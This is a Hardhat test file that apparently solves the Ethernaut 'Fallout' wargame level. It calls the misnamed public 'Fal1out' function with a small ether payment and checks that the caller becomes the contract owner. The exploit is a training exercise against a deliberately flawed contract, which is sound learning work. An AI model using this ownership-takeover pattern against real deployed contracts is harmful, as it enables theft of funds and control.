import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";

describe("Start Point", async function () {
  let fallout: any;

  let owner: any;
  let user1: any;
  let user2: any;

  beforeEach("Deployments", async function () {
    [owner, user1, user2] = await ethers.getSigners();
    const falloutFactory = await ethers.getContractFactory("Fallout");

    fallout = await falloutFactory.deploy();
  });

  describe("Hack Fallout", async function () {
    it("Should call the Fal1out fake method transfering ownership", async function () {
      await fallout.connect(user1).Fal1out({
        value: ethers.utils.parseEther("0.009"),
      });

      expect(await fallout.owner()).to.equal(user1.address);
    });
  });
});
